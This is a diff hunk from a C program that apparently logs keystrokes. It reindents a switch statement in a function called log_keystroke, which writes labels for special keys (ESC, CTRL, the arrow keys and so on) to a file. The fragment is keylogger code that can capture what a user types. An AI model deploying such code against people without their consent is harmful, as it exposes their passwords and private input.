@@ -107,43 +107,43 @@ void log_keystroke(FILE * file, struct input_event event)
     // Handle slightly less special key events
     if (event.value == KEYPRESSED && PRINT_SPECIAL_KEYS) 
         switch(event.code) {
-			case ESCAPE:
+		case ESCAPE:
 	            fprintf(file, "<ESC>");
 	            break;
-			case BACKSPACE:
+		case BACKSPACE:
 	            fprintf(file, "<BACKSPACE>");
 	            break;
-			case LEFT_CTRL:
-			case RIGHT_CTRL:
+		case LEFT_CTRL:
+		case RIGHT_CTRL:
 	            fprintf(file, "<CTRL>");
 	            break;
-			case LEFT_ALT:
-			case RIGHT_ALT:
+		case LEFT_ALT:
+		case RIGHT_ALT:
 	            fprintf(file, "<ALT>");
 	            break;
-			case LEFT_META:
-			case RIGHT_META:
+		case LEFT_META:
+		case RIGHT_META:
 	            fprintf(file, "<META>");
 	            break;
-			case MENU:
+		case MENU:
 	            fprintf(file, "<MENU>");
 	            break;
-			case DELETE:
+		case DELETE:
 	            fprintf(file, "<DELETE>");
 	            break;
-			case UP_ARROW:
+		case UP_ARROW:
 	            fprintf(file, "<UPARROW>");
 	            break;
-			case DOWN_ARROW:
+		case DOWN_ARROW:
 	            fprintf(file, "<DOWNARROW>");
 	            break;
-			case LEFT_ARROW:
+		case LEFT_ARROW:
 	            fprintf(file, "<LEFTARROW>");
 	            break;
-			case RIGHT_ARROW:
+		case RIGHT_ARROW:
 	            fprintf(file, "<RIGHTARROW>");
 	            break;
-        }
+      }
 
 
     // Convert keycode to a character and log it.
